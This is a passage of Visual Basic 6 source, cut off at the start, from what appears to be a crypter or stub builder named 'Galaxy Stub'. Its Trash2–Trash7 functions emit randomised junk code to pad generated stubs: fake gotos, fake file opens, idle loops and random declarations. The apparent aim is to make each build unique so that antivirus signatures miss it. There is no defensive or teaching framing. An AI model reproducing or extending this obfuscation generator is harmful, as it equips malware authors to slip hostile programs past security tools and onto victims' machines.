    FAERQW = FAERQW + "next " + skldjfqs & vbCrLf
Trash2 = FAERQW

End Function

Function Trash3() As String ' Fake Goto

Dim sdrHAUQ3IWJ As String
sdrHAUQ3IWJ = ""
Dim RN15 As String
Dim RN16 As String

Sleep (500)

Randomize
RN15 = GenNumKey(RandomNumber(38, 33), 16)
RN16 = GenNumKey(RandomNumber(35, 24), 19)

sdrHAUQ3IWJ = sdrHAUQ3IWJ + "goto " + RN15 & vbCrLf + RN15 + ":" & vbCrLf
sdrHAUQ3IWJ = sdrHAUQ3IWJ + "goto " + RN16 & vbCrLf + RN16 + ":" & vbCrLf

Trash3 = sdrHAUQ3IWJ

End Function

Function Trash4() As String 'Fake Open File
Dim JJ As String
Dim fasRQJaios As String
Dim RWEFres As String
Dim MSIeurqawers As String

Sleep (200)

Randomize
fasRQJaios = GenNumKey(RandomNumber(27, 19), 16)
Randomize
RWEFres = GenNumKey(RandomNumber(33, 28), 20)
Randomize
MSIeurqawers = GenNumKey(RandomNumber(28, 21), 18)
Randomize

 Randomize
        fasRQJaios = Int(Rnd * 50) + 5
        RWEFres = GenNumKey(RandomNumber(30, 25), 20)
        
        JJ = JJ + "Goto " & RWEFres & vbCrLf
        JJ = JJ + "Dim " & MSIeurqawers + " As String" & vbCrLf
        JJ = JJ + "Open " & """" & GenNumKey(30, 12) & """" & " For Binary as #" & fasRQJaios & vbCrLf
        JJ = JJ + RWEFres & ":" & vbCrLf

Trash4 = JJ

End Function

Function Trash5() As String 'loop / DoWhile
            
Randomize
    Dim TRW As String
    Dim aName As String

Sleep (200)

    aName = GenNumKey(RandomNumber(38, 32), 4)
        TRW = "Dim " & aName & " As Integer" & vbNewLine & _
            aName & " = " & Int(Rnd * 15) & vbNewLine & _
            "Do while " & aName & " < " & Int(20 * Rnd) + 20 & vbNewLine & _
            "   DoEvents:" & aName & " = " & aName & " + 1" & vbNewLine & _
            "Loop"

    Trash5 = TRW
     
End Function

Function Trash6(cNumber As Integer) As String

Dim ODSkfjaq3           As String
Dim TAEWRQawjhsiu       As String
        
    Sleep (200)
    
    Randomize
    TAEWRQawjhsiu = GenNumKey(RandomNumber(35, 28), 23)
        
        Select Case cNumber
            
            Case 1
                ODSkfjaq3 = ODSkfjaq3 + "Dim " + TAEWRQawjhsiu + " as string" & vbCrLf
                ODSkfjaq3 = ODSkfjaq3 + TAEWRQawjhsiu + " = " + """" + GenNumKey(28) + """" & vbCrLf
            Case 2
                ODSkfjaq3 = ODSkfjaq3 + "Dim " + TAEWRQawjhsiu + " as integer" & vbCrLf
                ODSkfjaq3 = ODSkfjaq3 + TAEWRQawjhsiu + " = " & RandomNumber(100, 2) & vbCrLf
            Case 3
                ODSkfjaq3 = ODSkfjaq3 + "Dim " + TAEWRQawjhsiu + " as Long" & vbCrLf
                ODSkfjaq3 = ODSkfjaq3 + TAEWRQawjhsiu + " = " & RandomNumber(6000, 1) & vbCrLf
            Case 4
                ODSkfjaq3 = ODSkfjaq3 + "Dim " + TAEWRQawjhsiu + " as Single" & vbCrLf
                ODSkfjaq3 = ODSkfjaq3 + TAEWRQawjhsiu + " = " & RandomNumber(25, 1) & vbCrLf
            Case 5
                ODSkfjaq3 = ODSkfjaq3 + "Dim " + TAEWRQawjhsiu + " as string" & vbCrLf
                ODSkfjaq3 = ODSkfjaq3 + Trash3 & vbCrLf
                ODSkfjaq3 = ODSkfjaq3 + TAEWRQawjhsiu + " = " + """" + GenNumKey(25) + """" & vbCrLf
        End Select
        
    Trash6 = ODSkfjaq3
 
End Function

Function Trash7(Density As Integer) As String

Dim GGStIO3 As String, IOSrjqa As Integer

Sleep (200)

For i = 1 To Density
    
DoEvents

Call Randomize

        IOSrjqa = Int(6 * Rnd)
    
        If IOSrjqa = 0 Then GGStIO3 = GGStIO3 + "Dim " + GenNumKey(RandomNumber(30, 24), 15) + " as string " & vbCrLf
        If IOSrjqa = 1 Then GGStIO3 = GGStIO3 + "Dim " + GenNumKey(RandomNumber(32, 27), 15) + " as integer " & vbCrLf
        If IOSrjqa = 2 Then GGStIO3 = GGStIO3 + "Dim " + GenNumKey(RandomNumber(33, 19), 18) + " as long " & vbCrLf
        If IOSrjqa = 3 Then GGStIO3 = GGStIO3 + "Dim " + GenNumKey(RandomNumber(36, 25), 15) + " as double " & vbCrLf
        If IOSrjqa = 4 Then GGStIO3 = GGStIO3 + "Dim " + GenNumKey(RandomNumber(35, 20), 13) + " as single " & vbCrLf
        If IOSrjqa = 5 Then GGStIO3 = GGStIO3 + "Dim " + GenNumKey(RandomNumber(37, 26), 12) + "()" + " as byte " & vbCrLf
    Next i

Trash7 = GGStIO3

End Function


Private Sub Form_Unload(Cancel As Integer)

Dim sPath As String
    sPath = Environ("tmp") & "\Galaxy Stub"

If DirExists(sPath) Then KillFolder (sPath)

End Sub

